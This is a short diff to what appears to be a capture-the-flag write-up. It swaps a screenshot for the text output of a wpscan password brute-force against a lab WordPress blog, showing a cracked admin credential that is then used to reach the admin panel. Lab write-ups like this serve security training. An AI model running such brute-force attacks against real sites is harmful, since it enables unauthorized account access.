@@ -90,7 +90,10 @@ $ wpscan --url http://10.10.95.248/blog --usernames admin \
 
 We got a successful pair of credentials!
 
-![](/img/validpasswordfound.png)
+```
+[!] Valid Combinations Found:
+  | Username: admin, Password: my2boys
+```
 
 Using these, we can now log into the adminstrator panel.
 
